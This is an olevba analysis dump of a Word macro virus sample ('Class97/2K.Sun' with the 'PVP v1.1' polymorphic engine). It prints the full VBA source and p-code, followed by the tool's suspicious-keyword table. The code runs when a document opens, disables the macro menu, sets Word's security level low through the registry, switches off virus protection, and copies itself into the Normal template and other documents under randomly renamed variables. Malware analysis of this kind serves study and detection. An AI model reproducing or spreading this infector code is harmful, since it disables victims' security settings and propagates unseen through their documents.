olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Pri.z
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Pri.z - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next: Randomize
Const Sf192757 = "9.0", Cq9231 = "Macro", Nx503520 = 3, Es977890 = 0, Vk32326 = &H1, Gj310926 = 1
If Application.Version = Sf192757 Then
CommandBars(Cq9231).Controls(Nx503520).Enabled = (Rnd * Es977890)
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = Vk32326
Else
Options.VirusProtection = (Rnd * Es977890)
End If
Options.SaveNormalPrompt = (Rnd * Es977890)
Set Fx625847 = ThisDocument.VBProject.VBComponents(Gj310926).CodeModule
If MacroContainer = ActiveDocument Then Set Dj73689 = NormalTemplate.VBProject.VBComponents(Gj310926).CodeModule Else Set Dj73689 = ActiveDocument.VBProject.VBComponents(Gj310926).CodeModule: Fv703154 = (Rnd * Gj310926)
If Fx625847.countoflines <> Dj73689.countoflines Then
Dj73689.deletelines Gj310926, Dj73689.countoflines
Dj73689.insertlines Gj310926, Kg124776(Fx625847.lines(Gj310926, Fx625847.countoflines))
If Fv703154 <> Es977890 Then ActiveDocument.SaveAs ActiveDocument.FullName
End If
If Day(Now()) = Hour(Now()) Then
ActiveDocument.Shapes.AddShape(msoShapeSun, 160.05, 99.2, 342#, 117#).Select
With Selection
.ShapeRange.Fill.ForeColor.RGB = RGB(255, 255, Es977890)
.ShapeRange.TextFrame.TextRange.Select
.TypeText Text:="Class97/2K.Sun" & Chr(11) & "by jackie twoflower" & Chr(11) & "Lz0NT/MVT"
.ParagraphFormat.Alignment = wdAlignParagraphCenter
End With
End If
End Sub
Private Function Kg124776(Vr925755) As String ' PVP v1.1
Const Es977890 = 0, Gj310926 = 1, Hr27639 = 21, Gt13859 = 22, Ar283631 = 65, Lr769743 = 122, Qp790133 = 999
Dim Sz8832(Gj310926 To Hr27639)
Sz8832(1) = "Sf192757": Sz8832(2) = "Cq9231": Sz8832(3) = "Nx503520": Sz8832(4) = "Es977890": Sz8832(5) = "Vk32326": Sz8832(6) = "Gj310926": Sz8832(7) = "Fx625847": Sz8832(8) = "Dj73689"
Sz8832(9) = "Hr27639": Sz8832(10) = "Gt13859": Sz8832(11) = "Ar283631": Sz8832(12) = "Lr769743": Sz8832(13) = "Qp790133": Sz8832(14) = "Kg124776": Sz8832(15) = "Sz8832": Sz8832(16) = "Tk74524"
Sz8832(17) = "Fj353293": Sz8832(18) = "Jm70677": Sz8832(19) = "Uq905459": Sz8832(20) = "Vr925755": Sz8832(21) = "Fv703154"
For Tk74524 = Gj310926 To Hr27639
Fj353293 = Chr(Ar283631 + Int(Rnd * Gt13859)) & Chr(Lr769743 - Int(Rnd * Gt13859)) & Int(Rnd * Qp790133) & Int(Rnd * Qp790133)
Jm70677 = Gj310926
Uq905459: Jm70677 = InStr(Jm70677 + Gj310926, Vr925755, Sz8832(Tk74524))
If Jm70677 <> Es977890 Then Vr925755 = Mid(Vr925755, Gj310926, (Jm70677 - Gj310926)) & Fj353293 & Mid(Vr925755, (Jm70677 + Len(Sz8832(Tk74524))), Len(Vr925755)): GoTo Uq905459
Next
Kg124776 = Vr925755
End Function
' Class97/2K.Sun & PVP v1.1 written by jackie twoflower /Lz0NT/MVT
' Freedom will only be available through revolution or death...

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Pri.z
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5694 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	ArgsCall Read 0x0000 
' Line #2:
' 	Dim (Const) 
' 	LitStr 0x0003 "9.0"
' 	VarDefn Sf192757
' 	LitStr 0x0005 "Macro"
' 	VarDefn Cq9231
' 	LitDI2 0x0003 
' 	VarDefn Nx503520
' 	LitDI2 0x0000 
' 	VarDefn Es977890
' 	LitHI2 0x0001 
' 	VarDefn Vk32326
' 	LitDI2 0x0001 
' 	VarDefn Gj310926
' Line #3:
' 	Ld Application 
' 	MemLd Version 
' 	Ld Sf192757 
' 	Eq 
' 	IfBlock 
' Line #4:
' 	Ld Rnd 
' 	Ld Es977890 
' 	Mul 
' 	Paren 
' 	Ld Nx503520 
' 	Ld Cq9231 
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #5:
' 	Ld Vk32326 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #6:
' 	ElseBlock 
' Line #7:
' 	Ld Rnd 
' 	Ld Es977890 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #8:
' 	EndIfBlock 
' Line #9:
' 	Ld Rnd 
' 	Ld Es977890 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #10:
' 	SetStmt 
' 	Ld Gj310926 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Fx625847 
' Line #11:
' 	Ld MacroContainer 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld Gj310926 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Dj73689 
' 	Else 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld Gj310926 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Dj73689 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	Ld Gj310926 
' 	Mul 
' 	Paren 
' 	St Fv703154 
' 	EndIf 
' Line #12:
' 	Ld Fx625847 
' 	MemLd countoflines 
' 	Ld Dj73689 
' 	MemLd countoflines 
' 	Ne 
' 	IfBlock 
' Line #13:
' 	Ld Gj310926 
' 	Ld Dj73689 
' 	MemLd countoflines 
' 	Ld Dj73689 
' 	ArgsMemCall deletelines 0x0002 
' Line #14:
' 	Ld Gj310926 
' 	Ld Gj310926 
' 	Ld Fx625847 
' 	MemLd countoflines 
' 	Ld Fx625847 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd Kg124776 0x0001 
' 	Ld Dj73689 
' 	ArgsMemCall insertlines 0x0002 
' Line #15:
' 	Ld Fv703154 
' 	Ld Es977890 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	Eq 
' 	IfBlock 
' Line #18:
' 	Ld msoShapeSun 
' 	LitR8 0x999A 0x9999 0x0199 0x4064 
' 	LitR8 0xCCCD 0xCCCC 0xCCCC 0x4058 
' 	LitR8 0x0000 0x0000 0x6000 0x4075 
' 	LitR8 0x0000 0x0000 0x4000 0x405D 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #19:
' 	StartWithExpr 
' 	Ld Selection 
' 	With 
' Line #20:
' 	LitDI2 0x00FF 
' 	LitDI2 0x00FF 
' 	Ld Es977890 
' 	ArgsLd RSet 0x0003 
' 	MemLdWith ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #21:
' 	MemLdWith ShapeRange 
' 	MemLd TextFrame 
' 	MemLd TextRange 
' 	ArgsMemCall Set 0x0000 
' Line #22:
' 	LitStr 0x000E "Class97/2K.Sun"
' 	LitDI2 0x000B 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0013 "by jackie twoflower"
' 	Concat 
' 	LitDI2 0x000B 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0009 "Lz0NT/MVT"
' 	Concat 
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #23:
' 	Ld wdAlignParagraphCenter 
' 	MemLdWith ParagraphFormat 
' 	MemSt Alignment 
' Line #24:
' 	EndWith 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	EndSub 
' Line #27:
' 	FuncDefn (Private Function Kg124776(Vr925755, id_FFFE As String) As String)
' 	QuoteRem 0x002E 0x0009 " PVP v1.1"
' Line #28:
' 	Dim (Const) 
' 	LitDI2 0x0000 
' 	VarDefn Es977890
' 	LitDI2 0x0001 
' 	VarDefn Gj310926
' 	LitDI2 0x0015 
' 	VarDefn Hr27639
' 	LitDI2 0x0016 
' 	VarDefn Gt13859
' 	LitDI2 0x0041 
' 	VarDefn Ar283631
' 	LitDI2 0x007A 
' 	VarDefn Lr769743
' 	LitDI2 0x03E7 
' 	VarDefn Qp790133
' Line #29:
' 	Dim 
' 	Ld Gj310926 
' 	Ld Hr27639 
' 	VarDefn Sz8832
' Line #30:
' 	LitStr 0x0008 "Sf192757"
' 	LitDI2 0x0001 
' 	ArgsSt Sz8832 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "Cq9231"
' 	LitDI2 0x0002 
' 	ArgsSt Sz8832 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Nx503520"
' 	LitDI2 0x0003 
' 	ArgsSt Sz8832 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Es977890"
' 	LitDI2 0x0004 
' 	ArgsSt Sz8832 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0007 "Vk32326"
' 	LitDI2 0x0005 
' 	ArgsSt Sz8832 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Gj310926"
' 	LitDI2 0x0006 
' 	ArgsSt Sz8832 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Fx625847"
' 	LitDI2 0x0007 
' 	ArgsSt Sz8832 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0007 "Dj73689"
' 	LitDI2 0x0008 
' 	ArgsSt Sz8832 0x0001 
' Line #31:
' 	LitStr 0x0007 "Hr27639"
' 	LitDI2 0x0009 
' 	ArgsSt Sz8832 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0007 "Gt13859"
' 	LitDI2 0x000A 
' 	ArgsSt Sz8832 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Ar283631"
' 	LitDI2 0x000B 
' 	ArgsSt Sz8832 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Lr769743"
' 	LitDI2 0x000C 
' 	ArgsSt Sz8832 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Qp790133"
' 	LitDI2 0x000D 
' 	ArgsSt Sz8832 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Kg124776"
' 	LitDI2 0x000E 
' 	ArgsSt Sz8832 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "Sz8832"
' 	LitDI2 0x000F 
' 	ArgsSt Sz8832 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0007 "Tk74524"
' 	LitDI2 0x0010 
' 	ArgsSt Sz8832 0x0001 
' Line #32:
' 	LitStr 0x0008 "Fj353293"
' 	LitDI2 0x0011 
' 	ArgsSt Sz8832 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0007 "Jm70677"
' 	LitDI2 0x0012 
' 	ArgsSt Sz8832 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Uq905459"
' 	LitDI2 0x0013 
' 	ArgsSt Sz8832 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Vr925755"
' 	LitDI2 0x0014 
' 	ArgsSt Sz8832 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Fv703154"
' 	LitDI2 0x0015 
' 	ArgsSt Sz8832 0x0001 
' Line #33:
' 	StartForVariable 
' 	Ld Tk74524 
' 	EndForVariable 
' 	Ld Gj310926 
' 	Ld Hr27639 
' 	For 
' Line #34:
' 	Ld Ar283631 
' 	Ld Rnd 
' 	Ld Gt13859 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld Lr769743 
' 	Ld Rnd 
' 	Ld Gt13859 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	Ld Qp790133 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	Ld Rnd 
' 	Ld Qp790133 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St Fj353293 
' Line #35:
' 	Ld Gj310926 
' 	St Jm70677 
' Line #36:
' 	Label Uq905459 
' 	Ld Jm70677 
' 	Ld Gj310926 
' 	Add 
' 	Ld Vr925755 
' 	Ld Tk74524 
' 	ArgsLd Sz8832 0x0001 
' 	FnInStr3 
' 	St Jm70677 
' Line #37:
' 	Ld Jm70677 
' 	Ld Es977890 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Vr925755 
' 	Ld Gj310926 
' 	Ld Jm70677 
' 	Ld Gj310926 
' 	Sub 
' 	Paren 
' 	ArgsLd Mid$ 0x0003 
' 	Ld Fj353293 
' 	Concat 
' 	Ld Vr925755 
' 	Ld Jm70677 
' 	Ld Tk74524 
' 	ArgsLd Sz8832 0x0001 
' 	FnLen 
' 	Add 
' 	Paren 
' 	Ld Vr925755 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St Vr925755 
' 	BoS 0x0000 
' 	GoTo Uq905459 
' 	EndIf 
' Line #38:
' 	StartForVariable 
' 	Next 
' Line #39:
' 	Ld Vr925755 
' 	St Kg124776 
' Line #40:
' 	EndFunc 
' Line #41:
' 	QuoteRem 0x0000 0x0041 " Class97/2K.Sun & PVP v1.1 written by jackie twoflower /Lz0NT/MVT"
' Line #42:
' 	QuoteRem 0x0000 0x003E " Freedom will only be available through revolution or death..."
' Line #43:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

